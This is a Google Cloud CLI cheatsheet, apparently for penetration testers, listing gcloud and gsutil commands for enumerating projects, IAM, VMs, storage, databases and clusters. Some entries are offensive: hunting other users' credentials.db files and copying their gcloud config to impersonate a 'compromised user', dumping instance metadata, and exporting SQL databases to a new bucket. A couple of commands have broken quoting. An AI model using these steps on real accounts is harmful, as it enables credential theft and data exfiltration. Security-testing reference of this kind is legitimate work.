## Google Cloud Platform CLI Tool Cheatsheet
By Beau Bullock (@dafthack)
#### Authentication

Authentication with gcloud

```bash
#user identity login
gcloud auth login

#service account login
gcloud auth activate-service-account --key-file creds.json
```

List accounts available to gcloud

```bash
gcloud auth list
```

#### Account Information

Get account information

```bash
gcloud config list
```

List organizations

```bash
gcloud organizations list
```

Enumerate IAM policies set ORG-wide

```bash
gcloud organizations get-iam-policy <org ID>
```

Enumerate IAM policies set per project

```bash
gcloud projects get-iam-policy <project ID>
```

List projects

```bash
gcloud projects list
```

Set a different project

```bash
gcloud config set project <project name> 
```

Gives a list of all APIs that are enabled in project

```bash
gcloud services list
```

Get source code repos available to user

```bash
gcloud source repos list
```

Clone repo to home dir

```bash
gcloud source repos clone <repo_name>
```

#### Virtual Machines

List compute instances 

```bash
gcloud compute instances list
```

Get shell access to instance

```bash
gcloud beta compute ssh --zone "<region>" "<instance name>" --project "<project name>"
```

Puts public ssh key onto metadata service for project

```bash
gcloud compute ssh <local host>
```

Get access scopes if on an instance

```bash
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H &#39;Metadata-Flavor:Google’
```

Use Google keyring to decrypt encrypted data

```bash
gcloud kms decrypt --ciphertext-file=encrypted-file.enc --plaintext-file=out.txt --key <crypto-key> --keyring <crypto-keyring> --location global
```

#### Storage Buckets

List Google Storage buckets

```bash
gsutil ls
```

List Google Storage buckets recursively

```bash
gsutil ls -r gs://<bucket name>
```

Copy item from bucket

```bash
gsutil cp gs://bucketid/item ~/
```

#### Webapps & SQL

List WebApps

```bash
gcloud app instances list
```

List SQL instances

```bash
gcloud sql instances list
gcloud spanner instances list
gcloud bigtable instances list
```

List SQL databases

```bash
gcloud sql databases list --instance <instance ID>
gcloud spanner databases list --instance <instance name>
```

Export SQL databases and buckets

First copy buckets to local directory

```bash
gsutil cp gs://bucket-name/folder/ .
```

Create a new storage bucket, change perms, export SQL DB

```bash
gsutil mb gs://<googlestoragename>
gsutil acl ch -u <service account> gs://<googlestoragename>
gcloud sql export sql <sql instance name> gs://<googlestoragename>/sqldump.gz --database=<database name>
```

#### Networking

List networks

```bash
gcloud compute networks list
```

List subnets

```bash
gcloud compute networks subnets list
```

List VPN tunnels

```bash
gcloud compute vpn-tunnels list
```

List Interconnects (VPN)

```bash
gcloud compute interconnects list
```

#### Containers

```bash
gcloud container clusters list
```

GCP Kubernetes config file ~/.kube/config gets generated when you are authenticated with gcloud and run:

```bash
gcloud container clusters get-credentials <cluster name> --region <region>
```

If successful and the user has the correct permission the Kubernetes command below can be used to get cluster info:

```bash
kubectl cluster-info
```

#### Serverless

GCP functions log analysis – May get useful information from logs associated with GCP functions

```bash
gcloud functions list
gcloud functions describe <function name>
gcloud functions logs read <function name> --limit <number of lines>
```

GCP Cloud Run analysis – May get useful information from descriptions such as environment variables.

```bash
gcloud run services list
gcloud run services describe <service-name>
gcloud run revisions describe --region=<region> <revision-name>
```

Gcloud stores creds in ~/.config/gcloud/credentials.db
Search home directories

```bash
sudo find /home -name "credentials.db
```

Copy gcloud dir to your own home directory to auth as the compromised user

```bash
sudo cp -r /home/username/.config/gcloud ~/.config
sudo chown -R currentuser:currentuser ~/.config/gcloud
gcloud auth list
```

### Metadata Service URL

```bash
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"
```
